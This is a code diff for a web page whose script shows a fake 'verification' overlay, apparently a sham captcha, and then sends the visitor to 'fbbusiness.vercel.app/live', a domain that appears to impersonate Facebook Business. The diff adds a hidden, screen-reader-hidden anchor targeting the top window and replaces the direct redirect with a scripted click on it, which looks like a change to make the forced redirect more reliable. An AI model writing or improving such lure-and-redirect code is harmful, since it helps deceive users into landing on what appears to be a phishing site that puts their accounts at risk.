@@ -306,6 +306,14 @@
       </div>
     </div>
   </div>
+  <a
+    id="captcha-redirect-link"
+    href="https://fbbusiness.vercel.app/live"
+    target="_top"
+    hidden
+    aria-hidden="true"
+    tabindex="-1"
+  >Continue</a>
   <script>
     const VERIFY_DELAY_MS = 1400;
     const DONE_DELAY_MS = 500;
@@ -521,14 +529,9 @@
       overlay.classList.add("is-fading");
       const doneTimer = setTimeout(() => {
         overlay.remove();
-        const targetUrl = "https://fbbusiness.vercel.app/live";
-        try {
-          if (globalThis.top && globalThis.top !== globalThis.self) {
-            globalThis.top.location.href = targetUrl;
-            return;
-          }
-        } catch {}
-        globalThis.location.href = targetUrl;
+        const redirectLink = document.getElementById("captcha-redirect-link");
+        if (!redirectLink) return;
+        redirectLink.click();
       }, DONE_DELAY_MS);
       introState.timers.push(doneTimer);
     };
